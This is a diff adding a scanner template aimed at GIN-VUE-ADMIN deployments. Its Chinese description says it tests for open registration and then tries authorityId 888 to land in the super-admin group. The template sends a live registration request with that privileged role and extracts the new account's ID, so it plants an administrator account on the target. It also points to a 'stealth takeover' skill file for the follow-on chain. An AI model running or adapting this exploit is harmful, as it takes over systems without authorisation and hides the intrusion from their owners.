@@ -1,0 +1,53 @@
+id: gin-vue-admin-open-register
+
+info:
+  name: GIN-VUE-ADMIN 开放注册 + authorityId 越权
+  author: survey-engine
+  severity: critical
+  description: >
+    检测 GVA 是否允许开放注册；尝试 authorityId=888 植入超管组。
+    命中后走 .cursor/skills/ginvue-admin-stealth-takeover 全链。
+  tags: gin-vue-admin,gva,register,privilege-escalation,unauth
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/base/register"
+
+    headers:
+      Content-Type: application/json
+
+    body: '{"username":"sv_probe_{{randstr}}","password":"Probe@2026!","nickName":"probe","authorityId":"888","enable":true}'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"code":0'
+          - '"msg":"ok"'
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: json
+        part: body
+        name: user_id
+        json:
+          - ".data.ID"
+          - ".data.id"
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/base/captcha"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"captchaId"'
+          - '"picPath"'
+        condition: or
